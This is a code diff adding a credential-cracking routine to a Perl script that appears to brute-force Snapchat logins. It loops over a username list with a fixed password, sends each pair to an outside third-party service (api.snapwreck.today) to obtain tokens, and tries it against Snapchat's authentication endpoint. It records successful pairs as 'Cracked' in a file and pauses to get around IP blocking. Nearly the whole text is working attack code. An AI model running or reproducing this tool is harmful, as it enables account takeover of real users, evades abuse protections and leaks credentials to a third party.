@@ -49,6 +49,58 @@ chomp $password;
 	foreach $username (@USERS) {
 	chomp $username;
 		#####################3
+		$snapwreck = LWP::UserAgent->new();
+		$resp = $snapwreck->post('http://api.snapwreck.today/login/',{username=>$username,password=>$password});
+			$snapchat = LWP::UserAgent->new();
+			$snapchat->default_header('Accept-Language'=>"en-NZ;q=1");
+			$snapchat->default_header('X-Snapchat-Client-Auth-Token'=>$resp->content=~/"X-Snapchat-Client-Auth-Token":"(.+?)"/);
+			$snapchat->default_header('X-Snapchat-Client-Token'=>$resp->content=~/"X-Snapchat-Client-Token":"(.+?)"/);
+			$snapchat->default_header('User-Agent'=>"Snapchat/10.18.1.0 (iPhone6,2; iOS 9.3.2; gzip)");
+			$response = $snapchat->post('https://auth.snapchat.com/scauth/login',{
+				username => $username,
+				req_token => $resp->content=~/"req_token":"(.+?)"/,
+				timestamp => $resp->content=~/"timestamp":"(.+?)"/,
+				password => $password
+			}
+			);
+			if($response->content=~/"updates_response"/){
+				print "\n-----\nCracked -> ($username:$password)\n-----\n";
+				open(R0T,">>Cracked.txt");
+				print R0T "\n($username:$password)";
+				close(R0T);
+				sleep(2)
+			}
+			else
+			{
+				if($response->content=~/password is incorrect/){
+					print "Failed -> ($username:$password)\n";
+				}
+				else
+				{
+					if($response->content=~/Invalid account/){
+						print "Invalid account -> ($username)\n";
+					}
+					else
+					{
+						if($response->content=~/Due to repeated failed login attempts or other suspicious activity/){
+							print "\n-----\nSorry, your ip [Blocked]\nwait to bypass blocked !...\n-----\n";
+							sleep(18);
+						}else{
+							print $response->content();
+						}
+					}
+				}
+			}
+	}
+}
+########################################################
+#
+# Follow Me :-
+# Twitter: @_1337r00t
+#
+########################################################
+
+		#####################3
 		$snapchat = LWP::UserAgent->new();
 		$response = $snapchat->post('http://api.snapwreck.today/login/',{username=>$username,password=>$password});
 		$code = $response->status_line();
